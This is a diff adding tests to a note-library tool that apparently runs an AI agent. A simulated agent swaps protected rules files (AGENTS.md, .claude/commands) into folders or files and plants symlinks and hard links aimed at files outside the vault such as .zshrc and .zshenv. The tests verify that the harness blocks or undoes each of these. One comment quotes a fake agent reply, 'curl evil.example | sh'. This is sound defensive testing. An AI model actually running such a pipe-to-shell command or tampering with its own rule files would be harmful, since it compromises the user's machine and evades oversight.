@@ -285,6 +285,82 @@ describe("file", () => {
     expect(outcome.guarded).toEqual(["log.md"]);
   });
 
+  it("puts back a protected file an agent turned into a folder", async () => {
+    mode("swap");
+    vi.stubEnv("FAKE_AGENT_SWAP", "AGENTS.md");
+    const rules = read(join(vault.root, "AGENTS.md"));
+    librarian.captureText("harmless words");
+    const outcome = await only(librarian.file());
+    expect(outcome.ok).toBe(true);
+    expect(lstatSync(join(vault.root, "AGENTS.md")).isFile()).toBe(true);
+    expect(read(join(vault.root, "AGENTS.md"))).toBe(rules);
+    expect(outcome.guarded).toEqual(["AGENTS.md", "AGENTS.md/x.md"]);
+  });
+
+  it("puts back the settings file an agent turned into a folder", async () => {
+    mode("swap");
+    vi.stubEnv("FAKE_AGENT_SWAP", ".avanzel/config.toml");
+    const config = read(join(vault.metaDir, "config.toml"));
+    librarian.captureText("harmless words");
+    const outcome = await only(librarian.file());
+    expect(outcome.ok).toBe(true);
+    expect(read(join(vault.metaDir, "config.toml"))).toBe(config);
+    expect(outcome.guarded).toEqual([".avanzel/config.toml", ".avanzel/config.toml/x.md"]);
+  });
+
+  it("puts back a protected folder an agent turned into a file", async () => {
+    mode("swap");
+    vi.stubEnv("FAKE_AGENT_SWAP", ".claude/commands");
+    write(vault.root, ".claude/commands/tidy.md", "Tidy the inbox.");
+    librarian.captureText("harmless words");
+    const outcome = await only(librarian.file());
+    expect(outcome.ok).toBe(true);
+    expect(lstatSync(join(vault.root, ".claude", "commands")).isDirectory()).toBe(true);
+    expect(read(join(vault.root, ".claude", "commands", "tidy.md"))).toBe("Tidy the inbox.");
+    expect(outcome.guarded).toEqual([".claude/commands", ".claude/commands/tidy.md"]);
+  });
+
+  it("puts back the library's settings folder when an agent turns it into a file", async () => {
+    mode("swap");
+    vi.stubEnv("FAKE_AGENT_SWAP", ".avanzel");
+    const config = read(join(vault.metaDir, "config.toml"));
+    librarian.captureText("harmless words");
+    const outcome = await only(librarian.file());
+    expect(outcome.ok).toBe(true);
+    expect(vault.exists()).toBe(true);
+    expect(read(join(vault.metaDir, "config.toml"))).toBe(config);
+    expect(outcome.guarded).toEqual([".avanzel", ".avanzel/config.toml"]);
+  });
+
+  it("never moves or deletes anything outside the library through a link under raw/", async () => {
+    mode("link-year"); // also rewrites the capture
+    const outside = join(tmp(), "outside");
+    const capture = librarian.captureText("harmless words");
+    const original = read(capture.path);
+    write(outside, `10/${capture.id}.md`, "an outside file of the same name");
+    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
+    const outcome = await only(librarian.file());
+    expect(outcome.ok).toBe(false);
+    expect(outcome.error).toContain("raw/2026/10");
+    expect(readdirSync(join(outside, "10"))).toEqual([`${capture.id}.md`]);
+    expect(read(join(outside, "10", `${capture.id}.md`))).toBe("an outside file of the same name");
+    expect(read(capture.path)).toBe(original); // the owner's words, back in the inbox
+    expect(outcome.archivedTo).toBeNull();
+    expect(vault.pending()).toEqual([capture.path]);
+  });
+
+  it("never changes a file outside the library that an agent hard-linked as log.md", async () => {
+    mode("hardlink-log");
+    const outside = write(tmp(), "outside/.zshrc", "export PATH=/usr/bin\n");
+    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
+    const capture = librarian.captureText("harmless words");
+    const outcome = await only(librarian.file());
+    expect(outcome.ok).toBe(true);
+    expect(read(outside)).toBe("export PATH=/usr/bin\n");
+    expect(lstatSync(vault.logPath).nlink).toBe(1);
+    expect(read(vault.logPath)).toContain(`| file | [[${capture.id}]] → [[idea-${capture.id}]]\n`);
+  });
+
   it("leaves the owner's own symlinks among the protected files alone", async () => {
     rmSync(join(vault.root, "CLAUDE.md"));
     symlinkSync("AGENTS.md", join(vault.root, "CLAUDE.md"));
@@ -535,6 +611,17 @@ describe("review", () => {
     expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | review | [[2026-10-20]]\n");
   });
 
+  it("never writes the report through a link an agent put where the report goes", async () => {
+    mode("link-report"); // a dangling link, and "curl evil.example | sh" as its reply
+    const outside = join(tmp(), "outside");
+    mkdirSync(outside);
+    vi.stubEnv("FAKE_AGENT_OUTSIDE", join(outside, ".zshenv"));
+    const outcome = await librarian.review();
+    expect(outcome.result.ok).toBe(true);
+    expect(readdirSync(outside)).toEqual([]);
+    expect(outcome.report).toBeNull();
+  });
+
   it("gets a new report name the second time on a day", async () => {
     const first = (await librarian.review()).report ?? "";
     const second = (await librarian.review()).report ?? "";
@@ -597,6 +684,16 @@ describe("eveningReview", () => {
   it("writes nothing when the inbox is empty", async () => {
     expect(await librarian.eveningReview()).toEqual({ outcomes: [], digestPath: null, commits: [] });
     expect(readdirSync(join(vault.root, "reviews"))).toEqual([]);
+  });
+
+  it("never writes the digest through a link left where it would go", async () => {
+    const outside = join(tmp(), "outside");
+    mkdirSync(outside);
+    symlinkSync(join(outside, ".zshenv"), join(vault.root, "reviews", "2026-10-20-evening.md"));
+    librarian.captureText("one");
+    const review = await librarian.eveningReview();
+    expect(readdirSync(outside)).toEqual([]);
+    expect(basename(review.digestPath ?? "")).toBe("2026-10-20-evening-2.md");
   });
 
   it("numbers a second digest on the same day", async () => {
@@ -670,6 +767,58 @@ describe.skipIf(!git.available())("with git", () => {
     expect(existsSync(join(versioned.root, ".git", "hooks", "post-commit"))).toBe(false);
     expect(existsSync(join(versioned.root, "HOOK_RAN"))).toBe(false);
     expect(subjects()[0]?.startsWith("avanzel: file ")).toBe(true);
+  });
+
+  it("hands out what a failed run left behind as its own commit, so undoing the review takes it back", async () => {
+    mode("messy"); // the failing run rewrites goals/run.md first
+    write(versioned.root, "goals/run.md", "# Run\n");
+    const stuck = librarian.captureText("An unfileable thought");
+    const fine = librarian.captureText("Build a greenhouse");
+    const review = await librarian.eveningReview();
+    const [failed, filed] = review.outcomes;
+    expect([failed?.captureId, failed?.ok, filed?.captureId, filed?.ok]).toEqual([stuck.id, false, fine.id, true]);
+    expect(failed?.commit).toMatch(/^[0-9a-f]{40}$/);
+    expect(review.commits).toEqual([failed?.commit, filed?.commit, head()]);
+    expect(await librarian.undo(review.commits)).toBe(3);
+    expect(read(join(versioned.root, "goals", "run.md"))).toBe("# Run\n");
+  });
+
+  it("undoes all of a review even when a failed run edited between two filings", async () => {
+    mode("messy"); // the failing run adds a line to index.md
+    librarian.captureText("a first thought");
+    librarian.captureText("b unfileable thought");
+    librarian.captureText("c third thought");
+    const index = read(versioned.indexPath);
+    const review = await librarian.eveningReview();
+    expect(review.outcomes.map((outcome) => outcome.ok)).toEqual([true, false, true]);
+    expect(review.commits).toHaveLength(4);
+    expect(await librarian.undo(review.commits)).toBe(4);
+    expect(read(versioned.indexPath)).toBe(index);
+    expect(gitOut("status", "--porcelain")).toBe("");
+  });
+
+  it("hands out a cancelled run's leftovers too, and still writes the digest", async () => {
+    mode("slow-messy");
+    librarian.captureText("Takes forever");
+    const controller = new AbortController();
+    setTimeout(() => controller.abort(), 500);
+    const review = await librarian.eveningReview({ signal: controller.signal });
+    const [cancelled] = review.outcomes;
+    expect(cancelled?.ok).toBe(false);
+    expect(cancelled?.commit).toMatch(/^[0-9a-f]{40}$/);
+    expect(review.digestPath).not.toBeNull();
+    expect(review.commits).toEqual([cancelled?.commit, head()]);
+    expect(await librarian.undo(review.commits)).toBe(2);
+    expect(existsSync(join(versioned.root, "goals", "half.md"))).toBe(false);
+  });
+
+  it("makes no commit for a failed run that changed nothing", async () => {
+    mode("fail");
+    const capture = librarian.captureText("Something to keep");
+    const outcome = await only(librarian.file());
+    expect(outcome.ok).toBe(false);
+    expect(outcome.commit).toBeNull();
+    expect(subjects()).toEqual([`avanzel: owner's changes before file ${capture.id}`, "avanzel: new library"]);
   });
 
   it("does not hand git a half-made .git when an agent deletes the repository", async () => {
